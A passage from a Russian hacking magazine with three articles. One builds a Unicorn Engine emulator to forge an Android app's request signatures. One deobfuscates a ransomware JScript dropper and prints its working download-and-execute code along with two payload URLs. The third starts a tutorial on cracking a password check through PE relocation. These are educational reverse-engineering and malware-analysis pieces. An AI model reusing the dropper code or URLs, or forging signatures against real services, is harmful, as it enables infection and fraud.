Воспользуемся коман дой dump binary memory <file_name> <start_ad‐
dress> <end_address>. Выполним ее для нашей библиотеки и стека.



  (gdb) dump binary memory dump_native_lib 0xa96cb000 0xa96ce000
  (gdb) dump binary memory stack 0xbf055000 0xbf854000



ПИШЕМ СВОЙ ЭМУЛЯТОР
Пока не закрывай терминал GDB, он еще понадобится. Скопиру ем дампы
в папку и в ней же создадим пустой файл. Сделаем заготов ку для работы,
как в тестовом при мере, и добавим загрузку данных из собранных дампов.


from __future__ import print_function
from unicorn import *
from unicorn.x86_const import *
def read(name):
    with open(name,'rb') as f:
        return f.read()
def hook_code(mu, address, size, user_data):
    print('>>> Tracing instruction at 0x%x, instruction size = 0x%x'
%(address, size))
libnative_adr = 0xa96cb000 # dump_native_lib 0xa96cd000 0xa96d0000
libnative_size = 0x1000 + 0x1000 + 0x1000
main_stack_adr = 0xbf055000 # dump_main_stack 0xbf055000 0xbf854000
main_stack_size = 0x7ff000
mu = Uc(UC_ARCH_X86, UC_MODE_32)
mu.mem_map(libnative_adr,libnative_size,UC_PROT_ALL)
mu.mem_write(libnative_adr, read("dump_native_lib"))
mu.mem_map(main_stack_adr,main_stack_size,UC_PROT_ALL)
mu.mem_write(main_stack_adr, read("stack"))
mu.hook_add(UC_HOOK_CODE, hook_code)
mu.reg_write(UC_X86_REG_EAX,0xa96ccfd8)
mu.reg_write(UC_X86_REG_ECX,0x22)
mu.reg_write(UC_X86_REG_EDX,0x90)
mu.reg_write(UC_X86_REG_EBX,0xa96ccfd8)
mu.reg_write(UC_X86_REG_ESP,0xbf84f2d0)
mu.reg_write(UC_X86_REG_EBP,0xbf84f3e8)
mu.reg_write(UC_X86_REG_ESI,0xbf84f360)
mu.reg_write(UC_X86_REG_EDI,0xbf84f2d0)
mu.reg_write(UC_X86_REG_EIP,0xa96cb83b)
mu.emu_start(0xa96cb83b,0xa96cb8be)

Как только мы запустим текущую версию, получим ошиб ку чтения нераз‐
меченных дан ных.



   $ python test.py
   >>> Tracing instruction at 0xa96cb83b, instruction size = 0x3
   >>> Tracing instruction at 0xa96cb83e, instruction size = 0x3
   >>> Tracing instruction at 0xa96cb841, instruction size = 0x4
   Traceback (most recent call last):
     File "test.py", line 38, in
       mu.emu_start(0xa96cb83b,0xa96cb8be)
     File "/usr/local/lib/python2.7/site‐packages/unicorn/unicorn.py",
  line 288, in emu_start
       raise UcError(status)
   unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)


Но в таком виде ошиб ка неинформативна: мы не знаем, по какому адресу
была попытка чтения. Допишем эмулятор, добавив хуки на доступ к памяти.


def hook_mem_invalid(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE_UNMAPPED:
        print(">>> Missing memory is being WRITE at 0x%x, data size
= %u, data value = 0x%x" %(address, size, value))
        return True
    else:
        print(">>> Missing memory is being READ at 0x%x, data size =
%u, data value = 0x%x" %(address, size, value))
        return False
def hook_mem_access(uc, access, address, size, value, user_data):
    if access == UC_MEM_WRITE:
        print(">>> Memory is being WRITE at 0x%x, data size = %u,
data value = 0x%x" %(address, size, value))
    else:   # READ
        print(">>> Memory is being READ at 0x%x, data size = %u" %(
address, size))
mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED,
hook_mem_invalid)
mu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
mu.hook_add(UC_HOOK_MEM_READ, hook_mem_access)

Запустим еще раз и посмотрим, что теперь выводит этот код.



   $ python main.py
   >>> Tracing instruction at 0xa96cb83b, instruction size = 0x3
   >>> Memory is being READ at 0xbf84f3a0, data size = 4
   >>> Tracing instruction at 0xa96cb83e, instruction size = 0x3
   >>> Memory is being READ at 0xbf84f38c, data size = 4
   >>> Tracing instruction at 0xa96cb841, instruction size = 0x4
   >>> Missing memory is being READ at 0xa10a1c70, data size = 1, data
  value = 0x0
   Traceback (most recent call last):
     File "test.py", line 56, in
       mu.emu_start(0xa96cb83b,0xa96cb8be)
     File "/usr/local/lib/python2.7/site‐packages/unicorn/unicorn.py",
  line 288, in emu_start
       raise UcError(status)
   unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)


Теперь видно, в чем проблема: код не может считать память по адресу 0x‐
a10a1c70. Кажется, я уже где‐то видел этот адрес! Он попадал ся, когда мы
искали, где хранится входящая строка. Проверим это, выполнив запрос
в ранее откры том тер минале GDB.



  (gdb) x/s 0xa10a1c70
  0xa10a1c70: "{\"login\":\"test\",\"password\":\"pass\"}"


Эти данные не нужны, нас интересует самос тоятельная загрузка своих дан‐
ных для под писи. Посмотрим в GDB, что происходит по адресу пос ледней
успешно выпол ненной команды 0xa96cb841.



  (gdb) disassemble
  ...
  0xa96cb83b <+283>:  mov    eax,DWORD PTR [esi+0x40]
  0xa96cb83e <+286>:  mov    ecx,DWORD PTR [esi+0x2c]
  0xa96cb841 <+289>:  movsx  eax,BYTE PTR [eax+ecx*1]
  0xa96cb845 <+293>:  cmp    eax,0x0
  ...


В eax передается адрес, который находит ся в esi+0x40. Разметим свой пус‐
той участок памяти и перезапишем адрес в esi+0x40 на свой.


string_for_hash = '{"login":"test","password":"pass"}'
mu.reg_write(UC_X86_REG_ECX,len(string_for_hash))
mu.reg_write(UC_X86_REG_EDX,len(string_for_hash)*4)
mu.mem_map(0x0,0x1000,UC_PROT_ALL)
mu.mem_write(0x0, bytes(string_for_hash))
mu.mem_write(mu.reg_read(UC_X86_REG_ESI)+0x40,b'\x00\x00\x00\x00')

Итак, мы создали свою строку string_for_hash, которую записываем в нашу
часть памяти. Для этого я выделил кусок, начиная с 0x0, длиной 1000 байтов.
Дальше мы получа ем адрес в памяти из регистра — это указатель на кучу —
и добавляем отступ 0x40. Потом в функцию mem_write передаем получив‐
шийся адрес и четыре байта, которые указывают на наш участок памяти,
в данном случае мы записываем адрес 0x00000000. Так как мы уже ссы лаем‐
ся на свою строку, то сто ит поменять константы, которые находятся в ecx
и edx, а именно размер входящей стро ки в символах и раз мер выходящего
массива в байтах.


             INFO

                     На каждый эле мент строки выделено четыре бай‐
                          та массива, так как элемент в массиве — это чис‐
                          ло, а не сим вол.


Попробуем запус тить.
   Теперь нам нужно получить посчитанные данные. Вспомним этап сбора
данных: указатель на массив находит ся в edx. Считаем с него данные сразу,
как эмуляция завершится, и выгрузим массив из памяти.


result = []
tmp = mu.mem_read(mu.reg_read(UC_X86_REG_EDX),len(string_for_hash)*4)
for index in range(len(string_for_hash)):
    time_int = hex(tmp[index*4:index*4+4][::‐1][3])[2:]
    if len(time_int)<2:
        time_int = '0'+ time_int
    result.append(time_int)
print(" ".join(result))

Здесь мы обращаемся к регис тру edx, результат с него переда ем в функцию
считывания памяти и получаем len(string_for_hash)*4 байтов, так как у
нас одно число занимает четыре байта. Дальше соз даем цикл по количеству
символов и режем наш массив на четырехбайтные числа, забирая только
последнюю часть числа (необходимые числа всегда будут в диапазоне одно‐
го байта). Функция hex() возвращает строку вида 0x23, поэтому мы отре‐
заем пер вые два символа и, наконец, проверяем, что число не состоит
из одного шестнад цатеричного (числа меньше 0xf), и добавляем 0 —
это нужно для красоты вывода. Запустим и посмотрим, что получилось.



   >>> Tracing instruction at 0xa96cb841, instruction size = 0x4
   >>> Memory is being READ at 0x22, data size = 1
   >>> Tracing instruction at 0xa96cb845, instruction size = 0x3
   >>> Tracing instruction at 0xa96cb848, instruction size = 0x6
   77 21 4f 57 4c 64 00 2e 39 01 4c 4e 7e 00 2e 2f 01 48 4a 7e 00 7b 6c
  51 5c 09 37 00 7c 62 50 4b 09 70


Отлично, то, что нужно! Если пом нишь, в начале статьи я продемонстрировал
подпись для тес товых данных, — результат идентичен. Теперь попробуем
передать более сложные данные, заменив нашу строку в коде на {"login":
"long_login","password":"long_pass"}.  Посчитаем  подпись  и  пос‐
мотрим, совпадает ли она с той, которая выводится исходным при ложением.
Для этого запус тим приложение без отладки и введем эти данные.



  Emulator ‐ 00 00 ... 00 00 00 7f 21 5e
  Original ‐ 77 21 ... 5b 6c 00 7f 21 5e


Почти весь мас сив, полученный от эмулятора, пустой, но зато пос ледние эле‐
менты совпадают. Интересно, почему так получается? Давай поп робуем
выводить элемент мас сива сразу после добавления. Мы точно зна ем, что
в начале цикла (если это не пер вая итерация, конечно) будет находиться мас‐
сив с недавно добавленным элементом. Сперва выведем значение регис‐
тров в начале каждой итерации. Для этого в функцию hook_code добавим
следующий код и выполним запуск.


if address == 0xa96cb83b:
      print('‐‐‐‐')
      print("EAX "+hex(int(mu.reg_read(UC_X86_REG_EAX))))
      print("ECX "+hex(int(mu.reg_read(UC_X86_REG_ECX))))
      print("EDX "+hex(int(mu.reg_read(UC_X86_REG_EDX))))

В консоли видим, что регистр eax после итераций цикла содержит количество
посчитанных и добав ленных в массив элементов.


 ‐‐‐‐
  EAX 0x1
  ECX 0x0
  EDX 0xbf84f2d0
 ‐‐‐‐
  EAX 0x2
  ECX 0x1
  EDX 0xbf84f2d0
 ‐‐‐‐
  EAX 0x3
  ECX 0x2
  EDX 0xbf84f2d0
 ‐‐‐‐
  EAX 0x4
  ECX 0x3
  EDX 0xbf84f2d0
 ‐‐‐‐
  EAX 0x5
  ECX 0x4
  EDX 0xbf84f2d0


Добавим сбор данных с массива сразу в начале итерации цикла. Для этого
перепишем полностью hook_code и передадим свой мас сив внутрь через
user_data, с помощью которого я получу данные из функции.


def hook_code(mu, address, size, user_data):
    if address == 0xa96cb83b:
        if int(mu.reg_read(UC_X86_REG_EAX))< 0x1180:
            tmp = mu.mem_read(mu.reg_read(UC_X86_REG_EDX)+(int(mu.
reg_read(UC_X86_REG_EAX))‐1)*4,4)
            time_int = hex(tmp[::‐1][3])[2:]
            if len(time_int)<2:
                time_int = '0'+ time_int
            user_data.append(time_int)
result = []
mu.hook_add(UC_HOOK_CODE, hook_code, user_data=result)
print(" ".join(result))

Результат стал нам ного лучше. Но пос той, один байт не совпада ет!



  Emulator ‐ 77 21 4f ... 67 05 6c 30 7f 21 5e
  Original ‐ 77 21 4f ... 67 5b 6c 00 7f 21 5e


Почему же так произошло в этот раз? В одном из случаев такой «битый» байт
у меня был сле дующим по счету байтом пос ле пос леднего в мас сиве. Тем
не менее сей час этот байт дальше от границы массива, чем прошлые запус‐
ки. Но я все еще считаю, что проблема непосредственно в размере массива.
Не забывай, что я пропускаю функцию _ZN7_JNIEnv11NewIntArrayEi@plt,
а это может приводить к проблемам. Раз уж мы забираем данные сразу пос ле
итерации цикла, то почему бы не забирать данные на этапе присваивания
одного элемента? Мы знаем, что наш массив находится по адре су из edx,
посмотрим, кто обращается к это му регистру в диапазоне 0xa96cb83b  —
0xa96cb8be.



  0xa96cd85f <+319>:  mov    DWORD PTR [esi+0x28],eax
  0xa96cd862 <+322>:  cmp    DWORD PTR [esi+0x28],0x118
  0xa96cd869 <+329>:  jge    0xa96cd880 ...
  0xa96cb86f <+335>:  mov    eax,DWORD PTR [esi+0x28]
  0xa96cb872 <+338>:  mov    ecx,DWORD PTR [esi+0x2c]
  0xa96cb875 <+341>:  mov    edx,DWORD PTR [esi+0x10]
  0xa96cb878 <+344>:  mov    DWORD PTR [edx+ecx*4],eax


В 0xa96cb878 происходит запись в edx, но это получится, только если eax <
0x118, о чем говорит нам 0xa96cd85f — 0xa96cd869. Давай изменим наш
hook_code, что бы забирать данные сразу на этапе сравнения, то есть в 0x‐
a96cd862.


def hook_code(mu, address, size, user_data):
    print('>>> Tracing instruction at 0x%x, instruction size = 0x%x'
%(address, size))
    if address == 0xa96cb862:
        result.append("".join('{:02x}'.format(mu.reg_read(UC_X86
_REG_EAX))))

Результат не очень красивый: 77 21 4f 57 4c 64 *3a1a481f* .... Сопос‐
тавим это с оригинальной подписью и увидим, что в выделенном месте
находится 0x00. Перепи шем сбор результата с учетом этой особенности.


if address == 0xa96cb862:
      if mu.reg_read(UC_X86_REG_EAX)>0x118:
          result.append("00")
      else:
          result.append("".join('{:02x}'.format(mu.reg_read(UC_X86
_REG_EAX))))

Запустим в последний раз и получим тот же результат.



  Emulator ‐ 77 21 4f 57 ... 44 67 5b 6c 00 7f 21 5e
  Original ‐ 77 21 4f 57 ... 44 67 5b 6c 00 7f 21 5e



ВЫВОДЫ
Я очень рад, если ты добрался до этой строки, прочитал и попробовал все,
что я описал. Это очень важ но, ведь все элементы тесно связаны между
собой. В конечном счете у нас получилось под делать подпись для любых сво‐
их дан ных. Сработало это благодаря Unicorn Engine, который позволил соз‐
дать эмулятор специально для этой задачи. В реальной жизни ты встретишь
алгоритмы подписи, шиф рования, любой другой защиты куда сложнее, чем
мой примитивный алгоритм, но под ход к решению будет почти такой же. Uni‐
corn Engine — это отличный швей царский нож, который в гра мот ных руках
может почти все.
ВЗЛОМ





                                                                    Дмитрий Воропаев
                                                                                   voropaevdmtr@gmail.com


ВРЕДОНОС
   JSНА

КАК CHROME ПОМОГ МНЕ РЕВЕРСИТЬ
ВИРУС‐ШИФРОВАЛЬЩИК




Наверняка ты хоть раз получал по электронной почте письмо
со ссыл кой на подозрительный архив. Авторы таких писем
делают  все  воз можное,  чтобы  нев ниматель ный  поль‐
зователь перешел по ссылке и поз волил заразить свой
компьютер. Подобное письмо приш ло и моему прияте лю,
и так он стал одной из жертв. А что это был за вредонос, мы
разберемся вместе.


Прежде чем обратиться ко мне, приятель нес колько раз попытал ся открыть
файл из архива. По его словам, ничего не произошло. Но я все равно велел
ему немедленно выключить компьютер и вытащить из него жесткий диск.
Однако было слишком поздно.
  Вирус уже успел зашифровать половину файлов на диске D и даже заб‐
рался в расшаренную папку. Часть файлов уда лось вос становить с помощью
инструментов для восста новления удаленных фай лов, но по закону под лости
самые важные файлы были утрачены. Дальше классика жанра: на рабочем
столе появилась новая картинка, а также текстовый файл с требованием
определенной сум мы за расшифровку данных и контактами зло умышленника.





                        Новые обои

Позднее я решил разоб раться с этим вирусом в песочнице (VirtualBox + Win‐
dows XP). В архиве я обнаружил файл JavaScript, точнее файл с расширением
.js и содер жимым, по синтаксису напоминающим JavaScript.


...
function yW() {
  var lN="";
  lN=lN+W(101)+W(5085/45‐0)+W(54+56)+W(983‐875)+W(1056/16+0)+W(32+71)
+W(3456/36+0)+W(1045‐932)+W(885‐819)+W(10*11)+W(26+73)+W(823‐723);
return lN;
}
function Gyh() {
  var eKt="";
  eKt=eKt;
  return eKt;
}
function Wb(Ea, Ki) {
  var kO = w(Ea);
  var YM = Szh();
  var Ofr = w(Ki);
  var laN = [To()][RkE()];
  while (YM < kO) {
    var hN = YM / ie();
    var cra = Ea[Hn()](YM);
    YM = YM + Efo();
    cra = cra + Ea[mO()](YM);
    YM = YM + Fi();
    var mM = Bie(cra, dkW());
    var WzA = Ki[CC()](hN % Ofr);
    var dCt = mM ^ WzA;
    var bHh = String[yW()](dCt);
      laN = laN + Gyh() + bHh;
  }
  return laN;
}
...


НЕПРАВИЛЬНЫЕ ПЧЕЛЫ
«Это неправильные пчелы! И JavaScript у них какой‐то неправильный», —
подумал я. К тому же путь от открытия файла .js до шифрования файлов,
на первый взгляд, не прос леживал ся.
   Есть в Windows такая вещь, как WSH — сервер сценариев Windows. Он
используется для запуска сце нариев, написанных на определенных скрип‐
товых языках, в том числе и на JScript — такие скрипты имеют расширение
.js.


             INFO

                           JScript — сценарный язык  программирования
                     компании  Microsoft,  являющийся  реализацией
                        стандарта ECMAScript. Син таксис JScript во мно‐
                      гом аналоги чен языку JavaScript компании Net‐
                         scape,  однако  JScript  может  использоваться
                      не только для добавления клиентских скрип тов
                       на веб‐страницы, но и для автоматизации адми‐
                       нистрирования Windows. За выполнение таких
                       скриптов отве чает компонент WScript — Windows
                            Script Host. Помимо языка JScript, под держивает‐
                        ся VBScript, а так же и некоторые дру гие допол‐
                        нительно  устанавлива емые  язы ки  (например,
                               Perl).


Переменные в коде — случайный набор букв. Так же мы знаем, что код содер‐
жит около ста фун кций, которые возвращают результат арифметических дей‐
ствий над константами, и около двадцати функций, которые тем или иным
образом обрабатывают эти результаты. Некоторые функции аналогично
работают со стро ковыми кон стантами. Это говорит о том, что код хорошо
обфусци рован.
   Весь сек рет заключа ется в функции eval(). Эта функция выполняет код,
переданный ей в качестве строки, а возвращает значение, равное пос ледне‐
му выраже нию. Рассмотрим одну из фун кций нашего шифровальщика.


function W(svu) {
  var bHh = eval(Nx() + (svu+1) + uSk());
  return bHh;
}

Давай раз берем ся, что здесь происходит.
  Функция Nx(), объявленная ранее, возвращает строку String.fromChar‐
Code(, а uSK() возвращает зак рыва ющую скобку. W() в качестве параметра
принимает число, прибавляет единицу и воз вра щает eval("String.from‐
CharCode(" + (svu+1) + ")"). Берет число, прибавляет единицу и перево‐
дит в CHAR. Затем символы группируются в другие строки и пода ются на вход
функции eval(), но уже в другом месте.


ПРИБЕГАЕМ К ПОМОЩИ CHROME
На изучение всех переменных и значений, которые эти переменные хранят,
ушло бы очень много времени. Но код написан на языке, аналогичном Java‐
Script, и кое‐что может упростить обфускацию. А имен но — консоль раз‐
работчика в браузере Chrome послужит нам отличным средством отладки.




        Попытка запустить весь код в консоли при вела к ошибке

Chrome ругается на объ ект под наз вани ем ActiveXObject. Этот объект
используется в Windows и поз воля ет соз давать управляющие элементы
ActiveX.


             INFO

                          ActiveX — фреймворк для определе ния програм‐
                     мных компонентов, пригодных к использованию
                       из программ, написанных на разных язы ках прог‐
                    раммирова ния.   Объекты   ActiveXObject
                       используются в приложениях для Windows, таких
                         как Internet Explorer, Microsoft Ofﬁce, Microsoft
                            Visual Studio, Windows Media Player, и самой опе‐
                      рационной сис темой.


Браузер не знает о таких прелестях Windows. ActiveXObject не был ука зан
в коде в прямом виде, а значит, нельзя закомментировать использующий его
код и запус тить. Следовательно, нель зя и посмотреть, что вообще происхо‐
дит. Но мы можем запустить отдельные функции и узнать, что они возвра‐
щают. К счастью, функции объявляются в том порядке, в котором они вызыва‐
лись. Это поз воля ет рассматривать не каждую функцию в отдельности, а бло‐
ки из нес кольких, при этом обращая внимание толь ко на результат последней
функции.
  Результат всегда был пос тоян ный, поэтому я решил, что его можно впи‐
сать вмес то вызова пос ледней функции, а сами функции удалить. Попутно я
запускал отредактирован ный код на виртуальной машине и сравнивал с ори‐
гина лом, что бы убедиться, что мои изме нения не повлияли на результат.
   Таким обра зом код сок ращается в разы. Вот пример одной из таких
цепочек. Функция xRy() в итоге возвращает String.from.


...
function RVt()
{ return GH + "g"+"."; }
function c()
{ return eval("String.fromCharCode(37+74)"); }
function G()
{ return "r"+c(); }
function LNe()
{ return qQ()+G();}
function xRy()
{ return RVt()+LNe()+"m"; }
...

На следующем шаге мне встретился уже известный нам ActiveXObject:


var we = eval("ActiveXObject");

Здесь соз дает ся переменная, вызывается функция eval(), которая возвра‐
щает объект ActiveXObject. Значит, мы можем удалить эту стро ку, а в мес‐
тах, где используется эта переменная, использовать сам объект. Методы
объектов тоже были обфусцированы. Каждое имя в зашифрованном виде
было определено двумя строками, а для расшифровки вызывалась функция
Wb().


function Wb(Ea, Ki) {
  var kO = w(Ea);
  var YM = Szh();
  var Ofr = w(Ki);
  var laN = [To()][RkE()];
  while (YM < kO) {
    var hN = YM / ie();
    var cra = Ea[Hn()](YM);
    YM = YM + Efo();
    cra = cra + Ea[mO()](YM);
    YM = YM + Fi();
    var mM = Bie(cra, dkW());
    var WzA = Ki[CC()](hN % Ofr);
    var dCt = mM ^ WzA;
    var bHh = String[yW()](dCt);
    laN = laN + Gyh() + bHh;
  }
  return laN;
}

Разбирать ся, как эта фун кция работает, необязательно. Ведь можно вызвать
ее в браузере с нужными строками. Эта строка, к примеру, превращается
в ScriptFullName:


Wb("350211334026350D0E253E290C20","facZ0RsxbIpHaEfKH0O88alv5fT70lEqy
iHGesg20zxqoDXccZ356pUTXw6G1aUM0COgxBm")

Но как вызвать метод, имя которо го хранится в строке? Автор зловреда знает
такой при ем.


var stream = new ActiveXObject("ADODB.Stream");
stream.["Open"]();
stream.["Type"] = 1;
stream.["Write"](XMLHTTP.ResponseBody);
stream.["Position"] = 0;

Еще один прием обфускации, который встречается в коде, — ложное ветвле‐
ние. Это зна чит, что создается переменная, сравнива ется сама с собой, а в
блок else вставляется ненужный код. Такой трюк не мешает анализу кода,
но замед ляет его.
  Шаг за шагом перед нами появ ляется исходный код зловреда. Для удобс‐
тва я заменил названия некоторых переменных на понятные. Код представ‐
ляет собой тело и одну функцию. Сначала объ явля ется массив строк, содер‐
жащий два адреса URL. Затем последовательно для каждого URL запускается
функция download, которая пытается скачать файл по принятому URL, а затем
запустить. Воз вращает true, если выполнилась успешно.


function download(url) {
  var WShell = new ActiveXObject("Wscript.Shell");
  var fsObject = new ActiveXObject("Scripting.FileSystemObject");
  var XMLHTTP =  new ActiveXObject("MSXML2.XMLHTTP");
  XMLHTTP.open("GET", url, 0);  // Создаем синхронный запрос
  XMLHTTP.send(); // Отсылаем запрос
  if (XMLHTTP.Status == 200) { // Если запрос прошел успешно,
    var newFile = fsObject.GetSpecialFolder(2) + "\\ " + fsObject.
GetTempName(); // получаем дескриптор для временного файла
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1; // Единица означает бинарные данные
    stream.Write(XMLHTTP.ResponseBody);
    stream.Position = 0;
    if (stream.Size < 10)
      return false;
    stream.SaveToFile(newFile); // Сохраняем файл
    WShell.run("cmd.exe /c " + newFile, 0);  // Запускаем файл
    fsObject.deleteFile(WScript.ScriptFullName); // Удаляем
    return true;
  } else {
    return false;
  }
  return true;
}
// Тело
var urls = [];
urls[0] = "http://www.interlaan.com/5e01a65eb3758.exe";
urls[1] = "http://vaibhavastrogemology.com/old/5e01a65eb3758.exe";
var flag = false;
var i = 0;
while (!flag) {
  if (i > 1)
    break;
  flag = download(urls[i]);
  i++;
}


ИТОГИ
Итак, я выяснил, что этот файл представляет собой лишь часть шифроваль‐
щика. Под видом документа он проникает на компьютер пользователя и заг‐
ружает модуль, который и провер нет всю грязную работу. В «Лаборатории
Касперского» такие шиф роваль щики выделяют в отдельный класс Trojan‐
Downloader.JS.Agent и описыва ют так:



     Обычно злов реды этого семей ства представляют собой обфусци-
      рованный скрипт. Зловреды используют функци онал ADODB.Stream,
      который поз воляет им скачивать и запускать фай лы DLL, EXE и PDF.

Что ж, на этом мое исследование закан чивается. Надеюсь, ты тоже почерпнул
из него немного полезного опыта.
ВЗЛОМ

ФУНДАМЕНТАЛЬНЫЕ
ОСНОВЫ
ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.





                                                            Юрий Язев
                                                                      Широко известен подПРОДОЛЖАЕМ                                        псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимыйОСВАИВАТЬ                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.comОТЛАДЧИК





В пре дыду щих статьях мы познакоми лись с двумя основны‐
ми типами хакер ского инструмен тария: дизассемблером
и отладчи ком. Первый слу жит для ста тичес кого изу чения
программного  обеспечения,   тог да   как   второй —
для динамичес кого. То есть дизассем блер откры вает образ
файла, хра няще гося на носителе, в то время как отладчик
раскрывает  картину приложения во время выполнения,
показы вает образ в памяти. В оче ред ной статье цик ла мы
продолжим изу чать глу бинное бурение чужого кода.


ПЕРЕМЕЩАЕМОСТЬ EXE
В прошлой статье мы остановились на том, что, най дя в памяти с помощью
отладчика адреса байтов, которые нуж но изменить, мы обнаружили, что
в файле на диске таких адресов нет. И какие инструкции в таком случае пра‐
вить?
  Другими сло вами, теперь нам надо разобраться, как процесс проецирует‐
ся в вир туаль ное адресное пространство, что бы соотнести адреса байтов,
находящихся в памяти, с их реальным расположением в фай ле на дис ке.
Конечно, у нас есть дизассемблер, с помощью которого мы нашли эти адреса
(см. пер вую статью). Это удалось во многом благодаря тому, что препари‐
руемая нами программа очень маленькая, и нам не составило труда разоб‐
раться в ее дизассемблированном лис тинге. А если бы исследуемая прог‐
рамма весила сотни мегабайт?
   Также мы выяс нили, что PE‐файл может быть заг ружен по адресу, отлично‐
му от того, для которо го он был создан (это свойство называется переме‐
щаемостью), при этом система автоматически корректирует все ссылки
на абсолютные адреса, заменяя их новыми значениями. В резуль тате образ
файла в памяти не будет соответствовать тому, что записано на диске. И это
происходит после каждой перезагрузки системы, а порой даже перезапус ка
приложения, вся кий раз PE‐файл раз мещается по новому адресу. Вдобавок
к этому если раньше (до «Висты») системный загрузчик мог перемещать
только DLL (в то же время, если ему не удавалось разместить в памяти
по заданным адресам EXE, Windows выдавала ошибку загрузки модуля), то
теперь исполняемые файлы тоже подвержены перемещению.
  Между тем ошиб ка загрузки модуля происходила довольно редко, потому
что, как мы прекрасно зна ем, для каждого процесса Windows выделяет
независимое виртуаль ное адресное пространство. Во вре мена 32‐битной
Windows это было 2 Гбайт ядерного прос транства и 2 Гбайт пользователь ско‐
го. То есть по факту для процесса выделялось только 2 Гбайт, а 2 Гбайт ядер‐
ного прос транства были общими для всех процессов, к которым код из поль‐
зовательского режима дос тупа не имел. При включении режима PAE поль‐
зовательскому  прос транству  доставалось  3  Гбайт  и,  соответственно,
1 Гбайт — ядерному. PAE в x86‐про цес сорах стал нужен для работы DEP, пре‐
пятствующей выполнению кода в секции данных. Он автоматичес ки включен
во всех более поздних про цес сорах. Если пользовательское пространство
обособлено для конкретного про цес са, то пространство ядра общее для всех
привилегированных механизмов, выполняющихся в 0‐м кольце.
  Для x64 картина в целом аналогична. Адресное пространс тво заметно
увеличилось, теоретически до 16 Эбайт. Но, так как современные процес‐
соры фактически используют только 48 бит для адресации пространства,
реально использует ся только малая часть: 8 Тбайт для пользователь ско го
режима и 248 Тбайт для ядерного. Конечно, пока эти размеры кажут ся заоб‐
лачными — при мерно как 4 Гбайт в конце 1980‐х. :)
   Теперь, когда в общих чертах картина обрисована, можно двигаться даль‐
ше. Наше приложение passCompare1 откомпилировано 32‐битным ком‐
пилятором. Это позволит нам изба виться от лиш них циферок, сох ранив
при этом смысл про исхо дяще го. Итак, чтобы най ти адрес нужной инс трукции
на диске, вкратце повторим последовательность действий из предыдущей
статьи, так как за прошедшее время ты навер няка перезагрузил компьютер,
поэтому адреса в памяти изменились.
  Сначала воспользуемся утилитой dumpbin из штатной поставки Visual Stu‐
dio, на этот раз с ее помощью найдем базовый адрес модуля — тот,
с которым работают HIEW  (или  другой шестнадцатеричный  редактор)
и дизас семблер:



   >dumpbin /headers passcompare1.exe


   OPTIONAL HEADER VALUES
   ...
   400000 image base (00400000 to 00405FFF)
   ...


Натравим отладчик на подопытную прог рамму. Определим адрес загрузки
модуля при ложе ния в памяти (в твоем случае результаты будут другими):



   0:004> lmf m passcompare1
   start     end        module    name
   00d30000 00d36000   passCompare1  passCompare1.exe


Далее нам нужно найти адрес инструкции, которую требует ся изменить.
Для это го первым делом надо найти рас положение эталонного пароля (он
находится в секции .rdata), поэтому воспользуемся коман дой !dh passCom‐
pare1, которая выведет сведения о секциях. Сложим адрес загрузки модуля
и виртуаль ный адрес секции .rdata.
   Таким образом,  в моем  случае  секция  .rdata  начинается  с  адре‐
са 0xD32000. Немного прок рутив вывод отладчика вниз, я вижу, что пароль
располагается по адресу 0xD32108. Теперь нам нужен адрес расположения
инструкции в памяти. Не напрягая мозг, легким дви жением рук пос тавим бряк
на пароль: ba r4 d32108. Про должим отладку и вве дем любой пароль, после
всплытия отладчика по команде  t сделаем шаг впе ред. И двумя строками
выше в дизассемблерном листинге отладчика мы видим сравнива ющую инс‐
трукцию test eax, eax, которую нам надо отломать, а слева в первом стол‐
бце — ее адрес: 0xD310A7.
   Если попробовать найти его в файле, то HIEW скажет, что такой адрес
отсутствует. Но теперь, ког да есть все необходимые зна чения, нетрудно пос‐
читать, что адрес 0xD310A7 будет соответствовать адресу


адрес инструкции в файле на диске == адрес инструкции в памяти – (
адрес загрузки модуля – базовый адрес модуля):
0xD310A7 – (0xD30000 – 0x400000) == D310A7 – 0x930000 == 0x4010A7

Для проверки заг лянем в дизассемблерный листинг (или первую статью) и с
удовлетворением обнаружим,  что  это  как  раз  тот  адрес, инструк цию
по которому мы правили:



   004010A7: 85 C0  test  eax,eax
   004010A9: 74 63  je    0040110E


Все вер но, посмотри, как хорошо это совпада ет с дам пом отладчика:



   00d310a7 85c0  test  eax, eax
   00d310a9 7463  je    passCompare1!main+0xce (00d3110e)


Следующим действием отломаем программу. Это мы уже проходили в треть‐
ем шаге первой статьи. Ничего нового непосредс твенно во взломе не появи‐
лось, мы наш ли адрес, а процедура кряка такая же: запускаем HIEW — и в
бой.


ПЕРЕМЕЩАЕМОСТЬ DLL
Под занавес прошлой статьи мы упомянули, что в старых версиях Windows
можно было загрузить один и тот же exe‐модуль два раза, представив его
в виде DLL. Однако сейчас этот трюк не прокатывает, собственно, он и не
нужен, поскольку, как мы увидели в предыдущем разделе, Windows свободно
перемещает в памяти загруженный exe‐модуль относительно заранее опре‐
деленных адресов. Теперь давай разберемся, как обстоят дела с динамичес‐
кими биб лиотеками.
  В том слу чае, когда адрес загрузки DLL заранее неиз вестен, системный
загрузчик корректирует непосредственные смещения в соответствии с выб‐
ранным базовым адресом загрузки. Это несколько замедляет загрузку при‐
ложения, но зато не ухудшает быстродействие самой программы.
   Единственная проблема — как отличить действительные непосредствен‐
ные смещения от констант, совпада ющих с ними по значению? Не дизассем‐
блировать же, в самом деле, DLL, чтобы разобрать ся, какие именно ячейки
в ней необходимо «подкрутить»? Верно, куда про ще перечислить их адреса
в спе циальной таблице, расположен ной непосредственно в загружаемом
